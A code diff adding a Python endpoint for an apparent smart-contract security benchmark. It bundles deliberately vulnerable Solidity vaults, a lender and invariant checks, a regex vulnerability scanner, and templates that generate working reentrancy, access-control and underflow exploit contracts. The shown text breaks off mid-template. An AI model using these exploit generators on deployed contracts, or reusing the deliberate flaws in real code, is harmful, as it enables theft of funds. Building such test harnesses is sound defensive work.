@@ -1,0 +1,728 @@
+# TRUST404 Track04 — live one-button prove endpoint (Vercel Python serverless).
+# 실제 in-memory EVM 에서: 타깃 배포 -> Exploit.sol 생성 -> Exploit 배포/실행 ->
+# checkAll 불변식 재검사. 프론트 버튼이 /api/prove?target=<Name> 로 호출한다.
+import os, json, time, re, random, warnings, traceback
+warnings.filterwarnings("ignore")
+os.environ.setdefault("SOLCX_BINARY_PATH", "/tmp/solcx-bin")
+from http.server import BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+
+SOLC = "0.8.24"
+EVM_VERSION = "cancun"
+DEFAULT_EXPLOIT_FUNDING_WEI = 10 * 10**18
+
+TARGETS = {
+ "ReentrantVault": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Minimal ETH vault. Users deposit ETH and withdraw their own\n/// recorded balance later. The vault also starts with some ambient float\n/// liquidity seeded at deployment.\ncontract ReentrantVault {\n    mapping(address => uint256) public balances;\n\n    event Deposited(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n\n    constructor() payable {}\n\n    function deposit() external payable {\n        require(msg.value > 0, \"zero deposit\");\n        balances[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    function withdraw() external {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0, \"no balance\");\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"transfer failed\");\n\n        balances[msg.sender] = 0;\n        emit Withdrawn(msg.sender, bal);\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for ReentrantVault.\n/// Each predicate is `view` and returns true = property holds (healthy),\n/// false = property violated (attack succeeded). checkAll bundles the\n/// individual predicates in the order declared in manifest.json.\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    /// @notice The vault must always hold at least the ETH it was seeded\n    /// with. A single honest deposit+withdraw nets to zero change, so only\n    /// a genuine accounting bug can push the balance below the seed.\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "ReentrantVault",
+    "src": "src/ReentrantVault.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "10000000000000000000",
+    "setup": "Setup.s.sol"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "vaultSolvent"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 5
+   }
+  }
+ },
+ "OpenVault": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice ETH vault with an administrative recovery path and an owner role.\ncontract OpenVault {\n    address public owner;\n    mapping(address => uint256) public balances;\n\n    event Deposited(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event OwnerChanged(address indexed newOwner);\n\n    constructor(address initialOwner) payable {\n        owner = initialOwner;\n    }\n\n    function deposit() external payable {\n        require(msg.value > 0, \"zero deposit\");\n        balances[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(balances[msg.sender] >= amount, \"insufficient balance\");\n        balances[msg.sender] -= amount;\n\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"transfer failed\");\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /// @notice Recovery hatch meant for the owner to rescue stuck funds.\n    function adminWithdraw(address to, uint256 amount) external {\n        (bool ok, ) = to.call{value: amount}(\"\");\n        require(ok, \"transfer failed\");\n    }\n\n    /// @notice Meant to let the owner hand off admin duties.\n    function setOwner(address newOwner) external {\n        owner = newOwner;\n        emit OwnerChanged(newOwner);\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for OpenVault.\n/// true = property holds (healthy), false = property violated.\ninterface IOpenVaultView {\n    function owner() external view returns (address);\n}\n\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.constructor_args[0].\n    address constant EXPECTED_OWNER = address(0xA11CE);\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IOpenVaultView(target).owner() == EXPECTED_OWNER;\n    }\n\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "OpenVault",
+    "src": "src/OpenVault.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [
+     "0x00000000000000000000000000000000000a11ce"
+    ],
+    "value_wei": "10000000000000000000",
+    "setup": "Setup.s.sol"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "ownerUnchanged",
+     "vaultSolvent"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 5
+   }
+  }
+ },
+ "BadAccounting": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Internal ETH credit ledger. Users can transfer credit to one\n/// another and redeem their own credit for ETH held by the contract.\ncontract BadAccounting {\n    mapping(address => uint256) public balanceOf;\n\n    event Transferred(address indexed from, address indexed to, uint256 amount);\n    event Redeemed(address indexed who, uint256 amount);\n\n    constructor() payable {}\n\n    function transfer(address to, uint256 amount) external {\n        unchecked {\n            balanceOf[msg.sender] -= amount;\n            balanceOf[to] += amount;\n        }\n        emit Transferred(msg.sender, to, amount);\n    }\n\n    function redeem(uint256 amount) external {\n        require(balanceOf[msg.sender] >= amount, \"insufficient credit\");\n        balanceOf[msg.sender] -= amount;\n\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"redeem failed\");\n        emit Redeemed(msg.sender, amount);\n    }\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for BadAccounting.\n/// true = property holds (healthy), false = property violated.\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    /// @notice No one is credited any balance at deploy time, so no one can\n    /// legitimately redeem anything yet. The contract's ETH balance must\n    /// therefore never drop below the seed float.\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "BadAccounting",
+    "src": "src/BadAccounting.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "10000000000000000000",
+    "setup": "Setup.s.sol"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "vaultSolvent"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 5
+   }
+  }
+ },
+ "NaiveOracle": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Minimal mintable ERC20-like token used only inside this target.\n/// `mint` is restricted to the single address that deployed it.\ncontract Token {\n    string public name;\n    string public symbol;\n    uint8 public constant decimals = 18;\n\n    address public immutable minter;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    constructor(string memory _name, string memory _symbol) {\n        name = _name;\n        symbol = _symbol;\n        minter = msg.sender;\n    }\n\n    function mint(address to, uint256 amount) external {\n        require(msg.sender == minter, \"not minter\");\n        totalSupply += amount;\n        balanceOf[to] += amount;\n        emit Transfer(address(0), to, amount);\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        _transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        uint256 allowed = allowance[from][msg.sender];\n        require(allowed >= amount, \"allowance exceeded\");\n        if (allowed != type(uint256).max) {\n            allowance[from][msg.sender] = allowed - amount;\n        }\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function _transfer(address from, address to, uint256 amount) internal {\n        require(balanceOf[from] >= amount, \"insufficient balance\");\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n        emit Transfer(from, to, amount);\n    }\n}\n\n/// @notice Thin constant-product spot-price pool. Anyone can swap; there is\n/// no fee and no external price feed, so the spot price simply reflects\n/// whatever the current on-chain reserves are.\ncontract Pool {\n    Token public col;\n    Token public bor;\n    uint256 public reserveCol;\n    uint256 public reserveBor;\n\n    constructor(Token _col, Token _bor) {\n        col = _col;\n        bor = _bor;\n    }\n\n    function sync() external {\n        reserveCol = col.balanceOf(address(this));\n        reserveBor = bor.balanceOf(address(this));\n    }\n\n    /// @return price of 1 COL expressed in BOR, scaled by 1e18.\n    function spotPrice() external view returns (uint256) {\n        require(reserveCol > 0, \"no liquidity\");\n        return (reserveBor * 1e18) / reserveCol;\n    }\n\n    function swapColForBor(uint256 colIn) external {\n        col.transferFrom(msg.sender, address(this), colIn);\n        uint256 borOut = (reserveBor * colIn) / (reserveCol + colIn);\n        reserveCol += colIn;\n        reserveBor -= borOut;\n        bor.transfer(msg.sender, borOut);\n    }\n\n    function swapBorForCol(uint256 borIn) external {\n        bor.transferFrom(msg.sender, address(this), borIn);\n        uint256 colOut = (reserveCol * borIn) / (reserveBor + borIn);\n        reserveBor += borIn;\n        reserveCol -= colOut;\n        col.transfer(msg.sender, colOut);\n    }\n}\n\n/// @notice Collateralized lending desk that prices collateral off the\n/// `Pool`'s live spot price with no averaging, staleness check, or bound.\ncontract NaiveOracle {\n    Token public collateralToken;\n    Token public borrowToken;\n    Pool public pool;\n\n    uint256 public totalCollateral;\n    uint256 public totalDebt;\n    mapping(address => uint256) public collateralOf;\n    mapping(address => uint256) public debtOf;\n\n    event Deposited(address indexed who, uint256 amount);\n    event Borrowed(address indexed who, uint256 amount);\n\n    constructor() payable {\n        collateralToken = new Token(\"Collateral\", \"COL\");\n        borrowToken = new Token(\"Borrow\", \"BOR\");\n        pool = new Pool(collateralToken, borrowToken);\n\n        // Thin starting liquidity: 1 COL == 1 BOR.\n        collateralToken.mint(address(pool), 100e18);\n        borrowToken.mint(address(pool), 100e18);\n        pool.sync();\n\n        // Fund the lending desk so it can pay out borrows.\n        borrowToken.mint(address(this), 1_000_000e18);\n    }\n\n    /// @notice Test faucet so anyone can try the protocol without an\n    /// external funding source.\n    function faucet() external {\n        borrowToken.mint(msg.sender, 1_000e18);\n    }\n\n    function depositCollateral(uint256 amount) external {\n        collateralToken.transferFrom(msg.sender, address(this), amount);\n        collateralOf[msg.sender] += amount;\n        totalCollateral += amount;\n        emit Deposited(msg.sender, amount);\n    }\n\n    function borrow(uint256 amount) external {\n        uint256 price = pool.spotPrice();\n        uint256 value = (collateralOf[msg.sender] * price) / 1e18;\n        require(debtOf[msg.sender] + amount <= value, \"exceeds collateral value\");\n\n        debtOf[msg.sender] += amount;\n        totalDebt += amount;\n        borrowToken.transfer(msg.sender, amount);\n        emit Borrowed(msg.sender, amount);\n    }\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for NaiveOracle.\n/// true = property holds (healthy), false = property violated.\ninterface INaiveOracleView {\n    function totalCollateral() external view returns (uint256);\n    function totalDebt() external view returns (uint256);\n}\n\ncontract Invariants {\n    /// @dev Ground-truth reference price (1 COL == 1 BOR), independent of\n    /// whatever the target's own pool currently reports.\n    uint256 constant FAIR_PRICE = 1e18;\n\n    /// @notice Outstanding debt must never exceed the fair value of the\n    /// collateral actually deposited.\n    function protocolSolvent(address target) public view returns (bool) {\n        INaiveOracleView t = INaiveOracleView(target);\n        return t.totalDebt() <= (t.totalCollateral() * FAIR_PRICE) / 1e18;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!protocolSolvent(target)) return (false, \"protocolSolvent\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "NaiveOracle",
+    "src": "src/NaiveOracle.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "0"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "protocolSolvent"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 600,
+    "max_attempts": 8
+   }
+  }
+ },
+ "SafeVault": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice ETH vault with checks-effects-interactions ordering and a\n/// reentrancy guard on withdrawal.\ncontract SafeVault {\n    mapping(address => uint256) public balances;\n    uint256 private locked = 1;\n\n    event Deposited(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n\n    modifier nonReentrant() {\n        require(locked == 1, \"reentrant call\");\n        locked = 2;\n        _;\n        locked = 1;\n    }\n\n    constructor() payable {}\n\n    function deposit() external payable {\n        require(msg.value > 0, \"zero deposit\");\n        balances[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    function withdraw() external nonReentrant {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0, \"no balance\");\n\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"transfer failed\");\n        emit Withdrawn(msg.sender, bal);\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for SafeVault.\n/// true = property holds (healthy), false = property violated.\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "SafeVault",
+    "src": "src/SafeVault.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "10000000000000000000",
+    "setup": "Setup.s.sol"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "vaultSolvent"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 5
+   }
+  }
+ },
+ "BoundedOwner": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Treasury where the owner can move funds only through a capped,\n/// time-locked proposal: at most 10% of the current balance per proposal,\n/// and only after a 2-day delay has passed.\ncontract BoundedOwner {\n    address public owner;\n    uint256 public constant MAX_WITHDRAW_BPS = 1000; // 10%\n    uint256 public constant TIMELOCK_DELAY = 2 days;\n\n    struct Proposal {\n        address to;\n        uint256 amount;\n        uint256 executeAfter;\n        bool executed;\n    }\n\n    mapping(uint256 => Proposal) public proposals;\n    uint256 public proposalCount;\n\n    event Proposed(uint256 indexed id, address to, uint256 amount, uint256 executeAfter);\n    event Executed(uint256 indexed id);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"not owner\");\n        _;\n    }\n\n    constructor(address initialOwner) payable {\n        owner = initialOwner;\n    }\n\n    function propose(address to, uint256 amount) external onlyOwner returns (uint256 id) {\n        require(amount <= (address(this).balance * MAX_WITHDRAW_BPS) / 10000, \"over cap\");\n        id = proposalCount++;\n        uint256 executeAfter = block.timestamp + TIMELOCK_DELAY;\n        proposals[id] = Proposal({to: to, amount: amount, executeAfter: executeAfter, executed: false});\n        emit Proposed(id, to, amount, executeAfter);\n    }\n\n    function execute(uint256 id) external onlyOwner {\n        Proposal storage p = proposals[id];\n        require(!p.executed, \"already executed\");\n        require(block.timestamp >= p.executeAfter, \"timelocked\");\n        p.executed = true;\n\n        (bool ok, ) = p.to.call{value: p.amount}(\"\");\n        require(ok, \"transfer failed\");\n        emit Executed(id);\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for BoundedOwner.\n/// true = property holds (healthy), false = property violated.\ninterface IBoundedOwnerView {\n    function owner() external view returns (address);\n}\n\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.constructor_args[0].\n    address constant EXPECTED_OWNER = address(0xA11CE);\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IBoundedOwnerView(target).owner() == EXPECTED_OWNER;\n    }\n\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "BoundedOwner",
+    "src": "src/BoundedOwner.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [
+     "0x00000000000000000000000000000000000a11ce"
+    ],
+    "value_wei": "10000000000000000000",
+    "setup": "Setup.s.sol"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "ownerUnchanged",
+     "vaultSolvent"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 5
+   }
+  }
+ }
+}
+
+# TRUST404 Track04 — static scanner.
+# 타깃 소스를 정규식/패턴으로 훑어 (a) 취약 유형별 점수와 (b) 템플릿 파라미터화에
+# 필요한 함수 시그니처를 추출한다. 특정 타깃 이름을 하드코딩하지 않는다 —
+# 공개셋에 없는 비공개 타깃에도 같은 패턴 규칙이 적용되게 한다.
+
+FAM_REENTRANCY = "reentrancy"
+FAM_ACCESS = "access_control"
+FAM_INTEGER = "integer_underflow"
+FAM_ORACLE = "oracle_manipulation"
+
+
+def _strip_comments(src):
+    src = re.sub(r"//[^\n]*", "", src)
+    src = re.sub(r"/\*.*?\*/", "", src, flags=re.S)
+    return src
+
+
+def _functions(src):
+    """Yield dicts describing each function: name, args(list of (type,name)), mods, body."""
+    out = []
+    # match `function name(args) visibility modifiers { ... }`
+    pat = re.compile(
+        r"function\s+(\w+)\s*\(([^)]*)\)([^\{;]*)(\{)", re.S)
+    for m in pat.finditer(src):
+        name = m.group(1)
+        raw_args = m.group(2).strip()
+        head = m.group(3)
+        body = _extract_block(src, m.end() - 1)
+        args = []
+        if raw_args:
+            for a in raw_args.split(","):
+                parts = a.split()
+                if not parts:
+                    continue
+                typ = parts[0]
+                an = parts[-1] if len(parts) > 1 else ""
+                args.append((typ, an))
+        out.append({
+            "name": name,
+            "args": args,
+            "head": head,
+            "payable": "payable" in head,
+            "external": ("external" in head or "public" in head),
+            "body": body,
+        })
+    return out
+
+
+def _extract_block(src, brace_idx):
+    depth = 0
+    i = brace_idx
+    n = len(src)
+    while i < n:
+        c = src[i]
+        if c == "{":
+            depth += 1
+        elif c == "}":
+            depth -= 1
+            if depth == 0:
+                return src[brace_idx + 1:i]
+        i += 1
+    return src[brace_idx + 1:]
+
+
+def _has_owner_guard(fn, src):
+    b = fn["body"]
+    if re.search(r"only\w*[Oo]wner", fn["head"]):
+        return True
+    if re.search(r"require\s*\(\s*msg\.sender\s*==\s*owner", b):
+        return True
+    if re.search(r"only\w+", fn["head"]) and "owner" in src.lower():
+        # custom modifier referencing owner elsewhere
+        return True
+    return False
+
+
+def scan_target(contract_src, invariants_src, manifest):
+    src = _strip_comments(contract_src)
+    fns = _functions(src)
+    scores = {FAM_REENTRANCY: 0, FAM_ACCESS: 0, FAM_INTEGER: 0, FAM_ORACLE: 0}
+    sig = {"functions": fns}
+
+    # ── Reentrancy ────────────────────────────────────────────────────────────
+    # external call sending value, and state zeroed/decremented AFTER the call
+    # (CEI violation), without a reentrancy mutex.
+    has_mutex = bool(re.search(r"nonReentrant|locked\s*==\s*1|_status", src))
+    for fn in fns:
+        b = fn["body"]
+        call_m = re.search(r"\.call\s*\{\s*value\s*:", b)
+        if not call_m:
+            continue
+        after = b[call_m.end():]
+        zeroes_after = re.search(r"balance[sf]?\w*\[[^\]]+\]\s*(=\s*0|-=)", after)
+        pays_sender = re.search(r"call\s*\{\s*value\s*:\s*\w+\s*\}\s*\(\s*\"\"\s*\)", b) or "msg.sender.call" in b
+        if zeroes_after and pays_sender:
+            scores[FAM_REENTRANCY] += 5
+            sig["reentrancy_withdraw"] = fn
+    if has_mutex:
+        scores[FAM_REENTRANCY] -= 4  # guarded → likely safe
+    # a payable deposit that credits msg.sender is required for the classic PoC
+    for fn in fns:
+        if fn["payable"] and re.search(r"balance[sf]?\w*\[\s*msg\.sender\s*\]\s*\+=\s*msg\.value", fn["body"]):
+            sig["reentrancy_deposit"] = fn
+
+    # ── Access control ────────────────────────────────────────────────────────
+    for fn in fns:
+        if not fn["external"]:
+            continue
+        b = fn["body"]
+        moves_value = re.search(r"\.call\s*\{\s*value\s*:", b)
+        sets_owner = re.search(r"\bowner\s*=", b)
+        if (moves_value or sets_owner) and not _has_owner_guard(fn, src):
+            # ignore the normal user withdraw that checks its own balance
+            checks_self_balance = re.search(r"balance[sf]?\w*\[\s*msg\.sender\s*\]", b)
+            if moves_value and checks_self_balance and not sets_owner:
+                continue
+            scores[FAM_ACCESS] += 5
+            if moves_value:
+                sig["access_drain"] = fn
+            if sets_owner:
+                sig["access_setowner"] = fn
+
+    # ── Integer underflow ─────────────────────────────────────────────────────
+    for m in re.finditer(r"unchecked\s*\{", src):
+        blk = _extract_block(src, src.index("{", m.start()))
+        if re.search(r"balance[sfO]?\w*\[[^\]]+\]\s*-=", blk):
+            scores[FAM_INTEGER] += 5
+    # need a redeem/withdraw that pays out `amount` for the drain to matter
+    for fn in fns:
+        b = fn["body"]
+        if re.search(r"\.call\s*\{\s*value\s*:", b) and any(t.startswith("uint") for t, _ in fn["args"]):
+            sig["integer_redeem"] = fn
+        if re.search(r"balance[sfO]?\w*\[\s*msg\.sender\s*\]\s*-=", b) and len(fn["args"]) >= 2:
+            sig["integer_transfer"] = fn
+
+    # ── Oracle manipulation ───────────────────────────────────────────────────
+    if re.search(r"spotPrice|getPrice|priceOf|reserve[01A-Za-z]*", src):
+        if re.search(r"\bborrow\b", src) and re.search(r"spotPrice|getPrice|reserve", src):
+            scores[FAM_ORACLE] += 5
+    if re.search(r"\bfaucet\b", src):
+        scores[FAM_ORACLE] += 1
+    if re.search(r"swap\w*For\w*|swap\s*\(", src):
+        scores[FAM_ORACLE] += 1
+    for fn in fns:
+        if fn["name"] == "borrow":
+            sig["oracle_borrow"] = fn
+        if fn["name"] == "faucet":
+            sig["oracle_faucet"] = fn
+        if fn["name"] == "depositCollateral":
+            sig["oracle_deposit"] = fn
+        if re.match(r"swap\w*For\w*", fn["name"] or ""):
+            sig["oracle_swap"] = fn
+
+    sig["scores"] = scores
+    sig["invariant_predicates"] = manifest.get("invariants", {}).get("predicates", [])
+    return sig
+
+
+# TRUST404 Track04 — strategy selection + Exploit.sol templates.
+# 각 취약 유형에 대해, scanner 가 뽑은 함수 시그니처를 채워 Exploit.sol 을
+# 결정론적으로 생성한다. 함수 이름을 하드코딩하지 않고 스캔 결과에서 가져오되,
+# 못 찾으면 이 트랙 공개셋의 관례적 이름으로 폴백한다.
+
+
+STRATEGY_ORDER = [FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE]
+
+HEADER = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
+
+
+def seeded_order(order, scores, seed):
+    """Deterministic ordering: score desc, ties broken by a seeded PRNG so the
+    same --seed always yields the same sequence."""
+    rng = random.Random(seed)
+    buckets = {}
+    for fam in order:
+        buckets.setdefault(scores.get(fam, 0), []).append(fam)
+    result = []
+    for score in sorted(buckets.keys(), reverse=True):
+        group = buckets[score][:]
+        rng.shuffle(group)
+        result.extend(group)
+    return result
+
+
+def _fn_name(findings, key, default):
+    fn = findings.get(key)
+    return fn["name"] if fn else default
+
+
+def build_exploit(fam, findings):
+    scores = findings["scores"]
+    if scores.get(fam, 0) <= 0:
+        return None
+    if fam == FAM_REENTRANCY:
+        return _reentrancy(findings)
+    if fam == FAM_ACCESS:
+        return _access(findings)
+    if fam == FAM_INTEGER:
+        return _integer(findings)
+    if fam == FAM_ORACLE:
+        return _oracle(findings)
+    return None
+
+
+def _reentrancy(findings):
+    deposit = _fn_name(findings, "reentrancy_deposit", "deposit")
+    wfn = findings.get("reentrancy_withdraw")
+    withdraw = wfn["name"] if wfn else "withdraw"
+    # withdraw may take a uint amount or no args
+    wargs = wfn["args"] if wfn else []
+    takes_amount = any(t.startswith("uint") for t, _ in wargs)
+    if takes_amount:
+        iface = (f"interface ITarget {{\n"
+                 f"    function {deposit}() external payable;\n"
+                 f"    function {withdraw}(uint256 amount) external;\n"
+                 f"}}\n\n")
+        run_call = f"target.{withdraw}(unit);"
+        re_call = f"target.{withdraw}(unit);"
+    else:
+        iface = (f"interface ITarget {{\n"
+                 f"    function {deposit}() external payable;\n"
+                 f"    function {withdraw}() external;\n"
+                 f"}}\n\n")
+        run_call = f"target.{withdraw}();"
+        re_call = f"target.{withdraw}();"
+    body = (
+        "// Strategy: reentrancy (CEI violation) — re-enter withdraw before the\n"
+        "// balance is zeroed, draining the seed float below the solvency floor.\n"
+        + iface +
+        "contract Exploit {\n"
+        "    ITarget public target;\n"
+        "    uint256 public unit;\n\n"
+        "    function run(address _t) external payable {\n"
+        "        target = ITarget(_t);\n"
+        "        unit = 1 ether;\n"
+        f"        target.{deposit}{{value: unit}}();\n"
+        f"        {run_call}\n"
+        "    }\n\n"
+        "    receive() external payable {\n"
+        f"        if (address(target).balance >= unit) {{ {re_call} }}\n"
+        "    }\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+def _access(findings):
+    drain = findings.get("access_drain")
+    setowner = findings.get("access_setowner")
+    lines = []
+    ifaces = []
+    if setowner:
+        ifaces.append(f"    function {setowner['name']}(address newOwner) external;")
+    if drain:
+        # signature: figure out arg order (address to, uint amount) heuristically
+        args = drain["args"]
+        addr_first = args and args[0][0] == "address"
+        if addr_first and len(args) >= 2:
+            ifaces.append(f"    function {drain['name']}(address to, uint256 amount) external;")
+            lines.append(f"        t.{drain['name']}(address(this), address(_t).balance);")
+        elif len(args) >= 1 and args[0][0].startswith("uint"):
+            ifaces.append(f"    function {drain['name']}(uint256 amount) external;")
+            lines.append(f"        t.{drain['name']}(address(_t).balance);")
+        else:
+            ifaces.append(f"    function {drain['name']}() external;")
+            lines.append(f"        t.{drain['name']}();")
+    if setowner:
+        lines.insert(0, f"        t.{setowner['name']}(address(this));")
+    if not lines:
+        return None
+    body = (
+        "// Strategy: broken access control — call the unguarded privileged\n"
+        "// function(s) directly to seize ownership and/or drain the vault.\n"
+        "interface ITarget {\n" + "\n".join(ifaces) + "\n}\n\n"
+        "contract Exploit {\n"
+        "    function run(address _t) external payable {\n"
+        "        ITarget t = ITarget(_t);\n"
+        + "\n".join(lines) + "\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+def _integer(findings):
+    transfer = _fn_name(findings, "integer_transfer", "transfer")
+    redeem = _fn_name(findings, "integer_redeem", "redeem")
+    body = (
+        "// Strategy: integer underflow (unchecked) — underflow the caller's\n"
+        "// balance to ~2**256 via transfer, then redeem the entire ETH float.\n"
+        "interface ITarget {\n"
+        f"    function {transfer}(address to, uint256 amount) external;\n"
+        f"    function {redeem}(uint256 amount) external;\n"
+        "}\n\n"
+        "contract Exploit {\n"
